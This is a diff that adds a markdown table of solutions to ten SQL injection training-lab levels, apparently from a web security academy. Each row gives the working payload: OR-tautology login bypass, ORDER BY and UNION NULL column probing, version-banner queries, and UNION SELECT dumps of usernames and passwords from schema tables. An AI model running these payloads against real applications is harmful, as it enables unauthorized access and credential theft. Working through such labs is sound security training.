@@ -1,0 +1,14 @@
+# Level 1 → 10
+
+| Level | Description | Solution | 
+| :--- | :--- | :--- | 
+| **1** | WHERE clause allowing retrieval of hidden data | Use Burp Suite to intercept the request, modify the category parameter to `Gifts' OR '1'='1` and submit, which shows the entire table. | 
+| **2** | Login bypass | Login with username: `administrator` and password: `' OR '1'='1`. | 
+| **3** | Querying the database type and version on Oracle | Use `'ORDER BY n --` to determine the number of tables, then `' UNION SELECT banner, NULL FROM v$version -- ` to get the version from the version view. | 
+| **4** | Querying the database type and version on MySQL and Microsoft | Use `'ORDER BY n --` to determine the number of tables, then `' UNION SELECT @@version, NULL -- ` to get the version. | 
+| **5** | Listing the database contents on non-Oracle databases | Use `'ORDER BY n --` to determine the number of tables, then `' UNION SELECT @@version, NULL -- ` to determine the database type, then `' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'public' --` to find `users_aqzqdl` table, alongside the `username_otflzy` and `password_xpyzig` columns, finally `' UNION SELECT username_otflzy, password_xpyzig FROM users_aqzqdl --` gives every username and their corresponding password. | 
+| **6** | Listing the database contents on Oracle | Use `'ORDER BY n --` to determine the number of tables, then `' UNION SELECT banner, NULL FROM v$version -- ` to determine the database type, then `'' UNION SELECT table_name, column_name FROM all_tab_columns --` to find `USERS_KMAUXI` table, alongside the `USERNAME_HXPSKK` and `PASSWORD_IIGNVZ` columns, finally `' UNION SELECT USERNAME_HXPSKK, PASSWORD_IIGNVZ FROM USERS_KMAUXI -- ` gives every username and their corresponding password. | 
+| **7** | Determining the number of columns returned by the query using `NULL` | Just determining the number of columns as seen previously, but using `' UNION SELECT NULL, [...], NULL --` instead of the `ORDER BY` method. | 
+| **8** | Finding a column containing text | Use `' UNION SELECT NULL, 'a', NULL --`, moving the `'a'` through each column until it is displayed on the page. Then replace the `'a'` with the requires string to complete the lab. |
+| **9** | UNION attack, retrieving data from other tables | Use `' ORDER BY n --` to determine the number of columns, then `' UNION SELECT username, password FROM users --` to retrieve the administrator's password. |
+| **10** | UNION attack, retrieving multiple values in a single column | Find database version and number of columns as previous, realise that only column 2 accepts strings, then use `' UNION SELECT NULL, username \|\| ':' \|\| password FROM users --` to combine both columns into a single output column. |
